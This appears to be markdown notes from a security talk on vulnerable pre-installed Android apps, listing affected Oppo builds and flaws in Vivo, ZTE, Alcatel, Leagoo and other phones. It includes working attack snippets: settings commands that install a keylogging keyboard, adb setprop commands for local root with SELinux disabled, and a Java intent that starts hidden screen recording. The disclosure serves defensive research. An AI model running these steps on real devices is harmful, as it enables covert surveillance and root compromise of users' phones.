### Vulnerability Assessment of Various Devices

#### R7 Plus
- **Country:** China
- **Status:** Not Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6795_15019-user
  - **Android Version:** 5.0 (LRX21M)
  - **Build Date:** 1465722913
  - **Keys:** dev-keys

#### R7S
- **Country:** China
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** msm8916_64-user
  - **Android Version:** 5.1.1 (LMY47V)
  - **Build Date:** eng.root.20160713.211744
  - **Keys:** dev-keys

#### Neo 5
- **Country:** Australia
- **Status:** Not Vulnerable
- **Build Details:**
  - **Build ID:** OPPO82_15066-user
  - **Android Version:** 4.4.2 (KOT49H)
  - **Build Date:** eng.root.1469846786
  - **Keys:** dev-key

#### R7 Plus
- **Country:** India
- **Status:** Not Vulnerable
- **Build Details:**
  - **Build ID:** msm8916_64-user
  - **Android Version:** 5.1.1 (LMY47V)
  - **Build Date:** eng.root.20160922.193102
  - **Keys:** dev-keys

#### A37
- **Country:** India
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** msm8916_64-user
  - **Android Version:** 5.1.1 (LMY47V)
  - **Build Date:** eng.root.20171008.172519
  - **Keys:** release-keys

#### F1S
- **Country:** Australia
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6750_15331-user
  - **Android Version:** 5.1 (LMY47I)
  - **Build Date:** 1509712532
  - **Keys:** release-keys

#### F5
- **Country:** Malaysia
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6763_17031-user
  - **Android Version:** 7.1.1 (N6F26Q)
  - **Build Date:** 1516160348
  - **Keys:** release-keys

#### R9
- **Country:** Australia
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6755_15311-user
  - **Android Version:** 5.1 (LMY47I)
  - **Build Date:** 1516344361
  - **Keys:** release-keys

#### F3
- **Country:** Pakistan
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6750_16391-user
  - **Android Version:** 6.0 (MRA58K)
  - **Build Date:** 1517824690
  - **Keys:** release-keys

#### F3
- **Country:** Vietnam
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6750_16391-user
  - **Android Version:** 6.0 (MRA58K)
  - **Build Date:** 1517824690
  - **Keys:** release-keys

#### A77
- **Country:** Australia
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6750_16391-user
  - **Android Version:** 6.0 (MRA58K)
  - **Build Date:** 1517824690
  - **Keys:** release-keys

#### R9
- **Country:** China
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6755_15111-user
  - **Android Version:** 5.1 (LMY47I)
  - **Build Date:** 1519426429
  - **Keys:** dev-keys

#### A39
- **Country:** Australia
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6750_16321-user
  - **Android Version:** 5.1 (LMY47I)
  - **Build Date:** 1520521221
  - **Keys:** release-keys

#### F3 Plus
- **Country:** Pakistan
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** msm8952_64-user
  - **Android Version:** 6.0.1 (MMB29M)
  - **Build Date:** eng.root.20180413.004413
  - **Keys:** release-keys

#### R11
- **Country:** China
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** sdm660_64-user
  - **Android Version:** 7.1.1 (NMF26X)
  - **Build Date:** eng.root.20180426.130343
  - **Keys:** release-keys

#### A57
- **Country:** Philippines
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** msm8937_64-user
  - **Android Version:** 6.0.1 (MMB29M)
  - **Build Date:** eng.root.20180508.104025
  - **Keys:** release-keys

#### A59S
- **Country:** China
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** full_oppo6750_15131-user
  - **Android Version:** 5.1 (LMY47I)
  - **Build Date:** 1525865236
  - **Keys:** dev-keys

#### A77
- **Country:** China
- **Status:** Vulnerable
- **Build Details:**
  - **Build ID:** msm8953_64-user
  - **Android Version:** 7.1.1 (NMF26F)
  - **Build Date:** eng.root.20180609.153403
  - **Keys:** dev-keys

### SKY Elite 6.0L+ - Command Execution as System User
- **Device:** SKY Elite 6.0L+
- **Issue:** The device has an old version of Adups software, allowing command execution as a system user via the vulnerable platform app `com.fw.upgrade.sysoper` (versionCode=238, versionName=2.3.8).
- **Update Status:** The device appears to have no way to update its firmware, despite the presence of Adups software.
- **Build Date:** Wed Dec 28 11:57:35 CST 2016
- **Purchase Location:** Micro Center in Fairfax, VA
- **Vendor:** SKY is a US vendor based in Florida
- **Source:** [Amazon](https://www.amazon.com/SKY-Devices-Android-Unlocked-Smartphone/dp/B01N9V55HI/)

### Setting Your App as the Default Keyboard for Keylogging
- **Steps:**
  1. Implement an Input Method Editor (IME) in the attacking app.
  2. Set the app as the default input method:
     ```sh
     /system/bin/settings put secure enabled_input_methods :com.my.app/.NotSomeKeyboardService
     /system/bin/settings put secure default_input_method com.my.app/.NotSomeKeyboardService
     ```
  3. Send key presses to the attacking app via a broadcast intent to a dynamically-registered broadcast receiver.
  4. Optionally, set the app as the default spell checker, though it may not get as much data as a custom keyboard.

### Capabilities of a Vulnerable Platform App
- **Devices:**
  - Asus ZenFone V Live
  - Asus ZenFone 3 Max
  - Oppo F5
  - SKY Elite 6.0L+

- **Capabilities:**
  - Obtain text messages
  - Obtain call log
  - Obtain contacts
  - Set as keyboard (keylogger)
  - Set as notification listener
  - Factory Reset
  - Call phone number
  - Take Screenshot
  - Record video
  - Install app
  - Set as spell checker
  - Write logcat log

### Insecure Rich Communication Services (RCS) App
- **Source:** [T-Mobile Revvl Plus](https://www.t-mobile.com/devices/t-mobile-revvl-plus)
- **Issue:** Exported interfaces allow zero-permission apps to send arbitrary text messages, read and modify text messages, and obtain phone numbers of the user’s contacts.
- **Affected Devices:**
  - Coolpad Defiant
  - T-Mobile Revvl Plus
  - ZTE ZMAX Pro
- **Package Names:**
  - `com.rcs.gsma.na.sdk`
  - `com.suntek.mway.rcs.app.service`

### ZTE ZMAX Champ Vulnerabilities
- **Programmatic Factory Reset:**
  - The `com.zte.zdm.sdm` app writes `--wipe_data` to `/cache/recovery/command` and boots into recovery mode, wiping `/data` and `/cache`.
- **Obtain Logcat and Modem Logs:**
  - Done in the same way as previously described.
- **Brick Device:**
  - The device will boot into recovery mode, try to factory reset, crash, and repeat.

- **Source:** [ZTE USA](https://www.zteusa.com/zmax-champ)

### Alcatel A30 – Local Root Privilege Escalation
- **Device:** Alcatel A30
- **Issue:** Certain read-only properties can be modified at runtime, allowing a socket that accepts and executes arbitrary commands as the root user.
- **Steps:**
  ```sh
  adb shell setprop ro.debuggable 1
  adb shell setprop ro.secure 0
  adb shell root
  adb shell setenforce 0
  adb shell
  ```

- **Socket Creation:**
  - Once `ro.debuggable` is set to 1, a world-writable socket named `factory_test` is created, which receives and executes commands as root.
- **Source:** [Amazon](https://www.amazon.com/gp/product/B01NC2RECJ)

### Leagoo P1 & Leagoo Z5C
- **Leagoo P1 (Android 7.0):**
  - Take a screenshot and write to SD card
  - Programmatic factory reset
  - Local root privilege escalation via ADB
- **Leagoo Z5C (Android 6.0):**
  - Send arbitrary text messages (modified `com.android.messaging` app)
  - Read the most recent text message from each conversation (modified `com.android.messaging` app)
  - Programmatic factory reset (modified `com.android.settings` app)

- **ADB Commands:**
  ```sh
  adb shell setprop ro.debuggable 1
  adb shell setprop ro.secure 0
  adb shell root
  adb shell
  ```

- **Source:** [Amazon UK](https://www.amazon.co.uk/LEAGOO-Z5C-Android-smartphone-1-3GHz/dp/B06X3QLCGY)

### Exposed Screenshot Capability
- **Vendors:**
  - Alcatel A30
  - Asus Zenfone 3 Max
  - Leagoo P1
  - Nokia 6 TA-1025
  - Sony Xperia L1

- **Issue:** Certain vendors have modified the Android OS to export the screenshot capability to any app on the device.
- **Malicious Apps:**
  - Can open apps to obtain sensitive data and examine active notifications.
  - Requires `READ_EXTERNAL_STORAGE` permission to access the screenshot and potentially `EXPAND_STATUS_BAR` to view current notifications.
- **User Experience:**
  - A screen animation is displayed and creates a notification.
  - Cannot be disabled, as the functionality lies within the Android system_server process.
  - Attacking app can soft reboot the device to remove the notification.

### Vivo V7 Vulnerabilities
- **Log Dumping:**
  - Dumps logcat, Bluetooth, and kernel logs to external storage.
  - Leaves a notification while logging, but logging app cannot be disabled.
- **Property Setting:**
  - Can enable screen touch coordinates to be written to the logcat log.
- **Screen Recording:**
  - Records the screen for 60 minutes to the attacking app’s directory.
  - A notification appears but can be removed quickly.
- **Recording Interval:**
  - Set by the `com.vivo.smartshot` app.
  - Screen recording is performed by the `/system/bin/smartshot` binary.

- **Intent Example:**
  ```java
  Intent i = new Intent();
  i.setAction("vivo.action.ACTION_START_RECORD_SERVICE");
  i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
  i.putExtra("vivo.flag.vedio_file_path", "/data/data/com.attacking.app/screen.mp4");
  i.putExtra("show_top_stop_view", false);
  startService(i);
  try {Thread.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}
  i = new Intent();
  i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
  stopService(i);
  try {Thread.sleep(500);} catch (InterruptedException e) {e.printStackTrace();}
  i = new Intent("vivo.acton.ACTION_CHANGE_TOP_STOP_VIEW");
  i.setClassName("com.vivo.smartshot", "com.vivo.smartshot.ui.service.ScreenRecordService");
  i.putExtra("show_top_stop_view", false);
  startService(i);
  ```

- **Source:** [Vivo](https://www.vivo.com/my/products/v7)

### Takeaways - Towards More Secure Apps
- **Best Practices:**
  - Do not export app components unnecessarily; enforce proper access control.
  - Do not assume apps without an accompanying AIDL file cannot interact with a bound service; they can.
  - Filter commands when allowing command execution as a system user.
  - Make it easier to report vulnerabilities by having a common email address such as `security@.com`.

- **Conclusion:**
  - Thank you for attending. For more details, please read the paper.

- **Source:** [Amazon](https://www.amazon.co.uk/LEAGOO-Z5C-Android-smartphone-1-3GHz/dp/B06X3QLCGY)